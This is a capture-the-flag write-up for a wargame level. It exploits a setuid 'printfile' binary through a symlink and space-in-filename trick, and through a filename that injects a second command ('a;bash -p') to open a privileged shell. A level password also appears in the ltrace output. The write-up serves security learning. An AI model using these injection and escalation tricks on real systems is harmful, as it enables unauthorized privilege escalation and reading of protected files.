### Leviathan level 2

There is a set-user-ID executable named 'printfile' in home directory. Running it I get: 

```bash
*** File Printer ***
Usage: ./printfile filename
```

- running `ltrace ./printfile /etc/leviathan_pass/leviathan3` I get:

```bash
__libc_start_main(0x80490ed, 2, 0xffffd454, 0 <unfinished ...>
access("/etc/leviathan_pass/leviathan3", 4)          = -1
puts("You cant have that file..."You cant have that file...
)                   = 27
+++ exited (status 1) +++
```

- running `ltrace ./printfile /etc/leviathan_pass/leviathan2` I get:

```bash
__libc_start_main(0x80490ed, 2, 0xffffd454, 0 <unfinished ...>
access("/etc/leviathan_pass/leviathan2", 4)          = 0
snprintf("/bin/cat /etc/leviathan_pass/lev"..., 511, "/bin/cat %s", "/etc/leviathan_pass/leviathan2") = 39
geteuid()                                            = 12002
geteuid()                                            = 12002
setreuid(12002, 12002)                               = 0
system("/bin/cat /etc/leviathan_pass/lev"...NsN1HwFoyN
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                               = 0
+++ exited (status 0) +++ "
```

So I see that the setuid printfile executable uses access() function to check if it has read permission to the given file (NOTE: access uses real uid when checking for permissions). If access() is successfule it created the str "/bin/cat {filename}" with the specified filename and calls system() on it. 

After some searching I found something called Time-of-Check to Time-of-Use vulnerability that can be exploited here. The executable uses access() to check permissions and then uses system() to cat the contents of the file. But between the two calls the file could have potentially been changed. I will try to use that fact.

#### Solution
- I create a temporary directory using 
`mkdir /tmp/leviathan2 && cd /tmp/leviathan2` . In here I create 3 files named a, b and "a b".  

- I create a symbolic link from b to '/etc/leviathan_pass/leviathan3' using `ln -sf /etc/leviathan_pass/leviathan3 b`.

- I run `/home/leviathan2/printfile "a b"` and I get the contents of /etc/leviathan_pass/leviathan3

That is because access() checks for read permissions on "a b" file which I created, but ```system(/bin/cat a b)``` will cat the contents of a and then the contents of b file, which is a symbolic link to the desired passwd. And because this is a set-uid binary we can get the desired passswd. 

#### Alternative solution

After implementing that I found a shorter and a bit smarter solution.

- Like before I can create a file named "a;bash -p" and a file named "a".
- After running `printfile "a;bash -p"` I get a new bash, and running `whoami` I see that I am now `leviathan3` and I can just cat the contents of the password.

This happens because when running `bash -p` prevents the binary from dropping the permissions. From the docs :

```bash
-p

Turn on privileged mode. In this mode, the $ENV and $BASH_ENV files are not processed, shell functions are not inherited from the environment, and the SHELLOPTS, BASHOPTS, CDPATH, and GLOBIGNORE variables, if they appear in the environment, are ignored. If the shell is started with the effective user (group) id not equal to the real user (group) id, and the -p option is not supplied, these actions are taken and the effective user id is set to the real user id. If the -p option is supplied at startup, the effective user id is not reset. Turning this option off causes the effective user and group ids to be set to the real user and group ids.
